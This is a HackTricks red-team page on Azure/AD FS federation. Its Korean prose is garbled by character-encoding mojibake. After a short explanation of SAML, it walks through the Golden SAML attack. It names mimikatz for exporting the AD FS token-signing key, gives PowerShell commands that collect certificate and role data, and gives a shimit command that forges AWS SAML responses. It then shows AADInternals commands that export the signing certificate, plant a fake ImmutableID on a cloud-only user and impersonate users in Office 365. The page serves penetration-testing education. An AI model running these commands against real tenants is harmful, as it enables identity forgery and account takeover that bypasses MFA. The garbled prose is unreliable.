# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation**ëŠ” **ì‹ ë¢°**ë¥¼ êµ¬ì¶•í•œ **ë„ë©”ì¸**ì˜ ì§‘í•©ì…ë‹ˆë‹¤. ì‹ ë¢°ì˜ ìˆ˜ì¤€ì€ ë‹¤ì–‘í•  ìˆ˜ ìˆì§€ë§Œ, ì¼ë°˜ì ìœ¼ë¡œ **ì¸ì¦**ì„ í¬í•¨í•˜ê³  ê±°ì˜ í•­ìƒ **ê¶Œí•œ ë¶€ì—¬**ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ì—°í•©ì—ëŠ” **ê³µìœ ëœ ë¦¬ì†ŒìŠ¤**ì— ëŒ€í•œ **ì‹ ë¢°**ë¥¼ êµ¬ì¶•í•œ **ì—¬ëŸ¬ ì¡°ì§**ì´ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì˜¨í”„ë ˆë¯¸ìŠ¤** í™˜ê²½ì„ **Azure AD**ì™€ **ì—°í•©**í•˜ê³  ì´ ì—°í•©ì„ ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¡œê·¸ì¸ ë°©ë²•ì€ ëª¨ë“  ì‚¬ìš©ì **ì¸ì¦ì´ ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ ë°œìƒ**í•˜ë„ë¡ ë³´ì¥í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ê´€ë¦¬ìê°€ ë³´ë‹¤ ì—„ê²©í•œ ì ‘ê·¼ ì œì–´ ìˆ˜ì¤€ì„ êµ¬í˜„í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. **AD FS** ë° PingFederateì™€ì˜ ì—°í•©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

ê¸°ë³¸ì ìœ¼ë¡œ, ì—°í•©ì—ì„œëŠ” ëª¨ë“  **ì¸ì¦**ì´ **ì˜¨í”„ë ˆë¯¸ìŠ¤** í™˜ê²½ì—ì„œ ë°œìƒí•˜ë©° ì‚¬ìš©ìëŠ” ëª¨ë“  ì‹ ë¢°ëœ í™˜ê²½ì—ì„œ SSOë¥¼ ê²½í—˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ìëŠ” **ì˜¨í”„ë ˆë¯¸ìŠ¤ ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ì—¬ **í´ë¼ìš°ë“œ** ì• í”Œë¦¬ì¼€ì´ì…˜ì— **ì ‘ê·¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë³´ì•ˆ ì£¼ì¥ ë§ˆí¬ì—… ì–¸ì–´(SAML)**ëŠ” ì œê³µì ê°„ì˜ ëª¨ë“  ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ **ì •ë³´**ë¥¼ **êµí™˜**í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

ì–´ë–¤ ì—°í•© ì„¤ì •ì—ì„œë„ ì„¸ ê°€ì§€ ë‹¹ì‚¬ìê°€ ìˆìŠµë‹ˆë‹¤:

* ì‚¬ìš©ì ë˜ëŠ” í´ë¼ì´ì–¸íŠ¸
* ID ì œê³µì(IdP)
* ì„œë¹„ìŠ¤ ì œê³µì(SP)

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. ì²˜ìŒì—, ì‚¬ìš©ìì— ì˜í•´ ì• í”Œë¦¬ì¼€ì´ì…˜(ì„œë¹„ìŠ¤ ì œê³µì ë˜ëŠ” SP, ì˜ˆ: AWS ì½˜ì†” ë˜ëŠ” vSphere ì›¹ í´ë¼ì´ì–¸íŠ¸)ì— ì ‘ê·¼í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ëŠ” íŠ¹ì • êµ¬í˜„ì— ë”°ë¼ í´ë¼ì´ì–¸íŠ¸ë¥¼ IdP(ì‹ ì› ì œê³µì)ë¡œ ì§ì ‘ ì•ˆë‚´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. ê·¸ í›„, SPëŠ” ì‚¬ìš©ì ì¸ì¦ì„ ìœ„í•´ ì ì ˆí•œ IdP(ì˜ˆ: AD FS, Okta)ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ SAML(ë³´ì•ˆ ì£¼ì¥ ë§ˆí¬ì—… ì–¸ì–´) AuthnRequestë¥¼ ì‘ì„±í•˜ê³  í´ë¼ì´ì–¸íŠ¸ë¥¼ ì„ íƒí•œ IdPë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸í•©ë‹ˆë‹¤.
3. IdPê°€ ì‚¬ìš©ì ì¸ì¦ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì¸ì¦ í›„, IdPì— ì˜í•´ SAMLResponseê°€ ì‘ì„±ë˜ì–´ ì‚¬ìš©ì í†µí•´ SPë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ, SPëŠ” SAMLResponseë¥¼ í‰ê°€í•©ë‹ˆë‹¤. ì„±ê³µì ìœ¼ë¡œ ê²€ì¦ë˜ë©´ IdPì™€ì˜ ì‹ ë¢° ê´€ê³„ë¥¼ ì˜ë¯¸í•˜ë©°, ì‚¬ìš©ìëŠ” ì ‘ê·¼ì„ í—ˆìš©ë°›ìŠµë‹ˆë‹¤. ì´ëŠ” ë¡œê·¸ì¸ í”„ë¡œì„¸ìŠ¤ì˜ ì™„ë£Œë¥¼ ë‚˜íƒ€ë‚´ë©° ì‚¬ìš©ìê°€ ì„œë¹„ìŠ¤ë¥¼ ì´ìš©í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

**SAML ì¸ì¦ ë° ì¼ë°˜ ê³µê²©ì— ëŒ€í•´ ë” ì•Œê³  ì‹¶ë‹¤ë©´ ë‹¤ìŒìœ¼ë¡œ ê°€ì„¸ìš”:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FSëŠ” ì£¼ì¥ ê¸°ë°˜ ì‹ ì› ëª¨ë¸ì…ë‹ˆë‹¤.
* "..ì£¼ì¥ì€ ì‚¬ìš©ìê°€ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ë° ì£¼ë¡œ ì‚¬ìš©ë˜ëŠ” (ì˜ˆ: ì´ë¦„, ì‹ ì›, ê·¸ë£¹) ë‹¨ìˆœí•œ ì§„ìˆ ì…ë‹ˆë‹¤."
* ì‚¬ìš©ìì˜ ì£¼ì¥ì€ SAML í† í° ë‚´ì— ì‘ì„±ë˜ë©°, IdPì— ì˜í•´ ê¸°ë°€ì„±ì„ ì œê³µí•˜ê¸° ìœ„í•´ ì„œëª…ë©ë‹ˆë‹¤.
* ì‚¬ìš©ìëŠ” ImmutableIDë¡œ ì‹ë³„ë©ë‹ˆë‹¤. ì´ëŠ” ì „ ì„¸ê³„ì ìœ¼ë¡œ ê³ ìœ í•˜ë©° Azure ADì— ì €ì¥ë©ë‹ˆë‹¤.
* ImmutableIDëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ ì‚¬ìš©ìì— ëŒ€í•œ ms-DS-ConsistencyGuidë¡œ ì €ì¥ë˜ë©°/ë˜ëŠ” ì‚¬ìš©ìì˜ GUIDì—ì„œ íŒŒìƒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìì„¸í•œ ì •ë³´ëŠ” [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

**Golden SAML ê³µê²©:**

* ADFSì—ì„œ SAML ResponseëŠ” í† í° ì„œëª… ì¸ì¦ì„œì— ì˜í•´ ì„œëª…ë©ë‹ˆë‹¤.
* ì¸ì¦ì„œê°€ ì†ìƒë˜ë©´ Azure ADì— ANY ì‚¬ìš©ìë¡œ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!
* PTA ë‚¨ìš©ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ, ì‚¬ìš©ìì— ëŒ€í•œ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ì´ë‚˜ MFAëŠ” íš¨ê³¼ê°€ ì—†ìœ¼ë©°, ì¸ì¦ ì‘ë‹µì„ ìœ„ì¡°í•˜ê³  ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
* ì¸ì¦ì„œëŠ” DA ê¶Œí•œìœ¼ë¡œ AD FS ì„œë²„ì—ì„œ ì¶”ì¶œí•  ìˆ˜ ìˆìœ¼ë©°, ì´í›„ ì¸í„°ë„·ì— ì—°ê²°ëœ ì–´ë–¤ ê¸°ê¸°ì—ì„œë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìì„¸í•œ ì •ë³´ëŠ” [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### Golden SAML

**ID ì œê³µì(IdP)**ê°€ ì‚¬ìš©ì ë¡œê·¸ì¸ì„ ìŠ¹ì¸í•˜ê¸° ìœ„í•´ **SAMLResponse**ë¥¼ ìƒì„±í•˜ëŠ” ê³¼ì •ì€ ë§¤ìš° ì¤‘ìš”í•©ë‹ˆë‹¤. IdPì˜ íŠ¹ì • êµ¬í˜„ì— ë”°ë¼ **ì‘ë‹µ**ì€ **ì„œëª…**ë˜ê±°ë‚˜ **ì•”í˜¸í™”**ë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” **IdPì˜ ê°œì¸ í‚¤**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ì ˆì°¨ëŠ” **ì„œë¹„ìŠ¤ ì œê³µì(SP)**ê°€ SAMLResponseì˜ ì§„ìœ„ë¥¼ í™•ì¸í•  ìˆ˜ ìˆê²Œ í•˜ì—¬, ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” IdPì— ì˜í•´ ë°œê¸‰ë˜ì—ˆìŒì„ ë³´ì¥í•©ë‹ˆë‹¤.

[ê³¨ë“  í‹°ì¼“ ê³µê²©](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)ê³¼ ìœ ì‚¬í•œ ì ì´ ìˆìœ¼ë©°, ì‚¬ìš©ìì˜ ì‹ ì› ë° ê¶Œí•œì„ ì¸ì¦í•˜ëŠ” í‚¤(KRBTGTëŠ” ê³¨ë“  í‹°ì¼“ì˜ ê²½ìš°, í† í° ì„œëª… ê°œì¸ í‚¤ëŠ” ê³¨ë“  SAMLì˜ ê²½ìš°)ë¥¼ ì¡°ì‘í•˜ì—¬ **ì¸ì¦ ê°ì²´**(TGT ë˜ëŠ” SAMLResponse)ë¥¼ ìœ„ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì–´ë–¤ ì‚¬ìš©ìë¡œë„ ê°€ì¥í•  ìˆ˜ ìˆìœ¼ë©°, SPì— ëŒ€í•œ ë¬´ë‹¨ ì ‘ê·¼ì„ í—ˆìš©í•©ë‹ˆë‹¤.

ê³¨ë“  SAMLì€ ëª‡ ê°€ì§€ ì¥ì ì„ ì œê³µí•©ë‹ˆë‹¤:

* **ì›ê²©ìœ¼ë¡œ ìƒì„±**í•  ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ ë„ë©”ì¸ì´ë‚˜ ì—°í•©ì˜ ì¼ë¶€ì¼ í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.
* **2ë‹¨ê³„ ì¸ì¦(2FA)**ê°€ í™œì„±í™”ë˜ì–´ ìˆì–´ë„ ì—¬ì „íˆ íš¨ê³¼ì ì…ë‹ˆë‹¤.
* í† í° ì„œëª… **ê°œì¸ í‚¤ëŠ” ìë™ìœ¼ë¡œ ê°±ì‹ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
* **ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ì€** ì´ë¯¸ ìƒì„±ëœ SAMLì„ ë¬´íš¨í™”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))ëŠ” ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ë¹„ì¦ˆë‹ˆìŠ¤ íŒŒíŠ¸ë„ˆ ê°„ì˜ **ì‹ ì› ì •ë³´ì˜ ì•ˆì „í•œ êµí™˜**ì„ ì´‰ì§„í•˜ëŠ” Microsoft ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤(ì—°í•©). ë³¸ì§ˆì ìœ¼ë¡œ ë„ë©”ì¸ ì„œë¹„ìŠ¤ê°€ ì—°í•© ë‚´ì˜ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ ì œê³µìì™€ ì‚¬ìš©ì ì‹ ì›ì„ ê³µìœ í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

AWSê°€ ì†ìƒëœ ë„ë©”ì¸ì„ ì‹ ë¢°í•˜ëŠ” ê²½ìš°(ì—°í•© ë‚´ì—ì„œ), ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ AWS í™˜ê²½ì—ì„œ **ëª¨ë“  ê¶Œí•œì„ íšë“**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³µê²©ì€ SAML ê°ì²´ì— ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” **ê°œì¸ í‚¤**ê°€ í•„ìš”í•˜ë©°, ì´ëŠ” ê³¨ë“  í‹°ì¼“ ê³µê²©ì—ì„œ KRBTGTê°€ í•„ìš”í•œ ê²ƒê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. AD FS ì‚¬ìš©ì ê³„ì •ì— ëŒ€í•œ ì ‘ê·¼ë§Œìœ¼ë¡œë„ ì´ ê°œì¸ í‚¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³¨ë“  SAML ê³µê²©ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ìš”êµ¬ ì‚¬í•­ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* **í† í° ì„œëª… ê°œì¸ í‚¤**
* **IdP ê³µê°œ ì¸ì¦ì„œ**
* **IdP ì´ë¦„**
* **ì—­í•  ì´ë¦„(ê°€ì •í•  ì—­í• )**
* ë„ë©”ì¸\ì‚¬ìš©ì ì´ë¦„
* AWSì˜ ì—­í•  ì„¸ì…˜ ì´ë¦„
* ì•„ë§ˆì¡´ ê³„ì • ID

_êµµê²Œ í‘œì‹œëœ í•­ëª©ë§Œ í•„ìˆ˜ì…ë‹ˆë‹¤. ë‚˜ë¨¸ì§€ëŠ” ì›í•˜ëŠ” ëŒ€ë¡œ ì…ë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._

**ê°œì¸ í‚¤**ë¥¼ ì–»ìœ¼ë ¤ë©´ **AD FS ì‚¬ìš©ì ê³„ì •**ì— ëŒ€í•œ ì ‘ê·¼ì´ í•„ìš”í•©ë‹ˆë‹¤. ê·¸ í›„, ê°œì¸ í‚¤ëŠ” [mimikatz](https://github.com/gentilkiwi/mimikatz)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ê°œì¸ ì €ì¥ì†Œì—ì„œ ë‚´ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. í•„ìš”í•œ ë‹¤ë¥¸ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê¸° ìœ„í•´ Microsoft.Adfs.Powershell ìŠ¤ëƒ…ì¸ì„ ë‹¤ìŒê³¼ ê°™ì´ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, ADFS ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
ì‚¬ìš©ìê°€ ê°€ì¥í•˜ê³ ì í•˜ëŠ” ìœ íš¨í•œ SAMLResponseë¥¼ ìŠì–´ë²„ë¦´ ìˆ˜ ìˆëŠ” ëª¨ë“  ì •ë³´ê°€ ìˆìŠµë‹ˆë‹¤ [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### ì˜¨í”„ë ˆë¯¸ìŠ¤ -> í´ë¼ìš°ë“œ
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ìì˜ ImmutableIDë¥¼ ìƒì„±í•˜ê³  ê·¸ë“¤ì„ ê°€ì¥í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## References

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
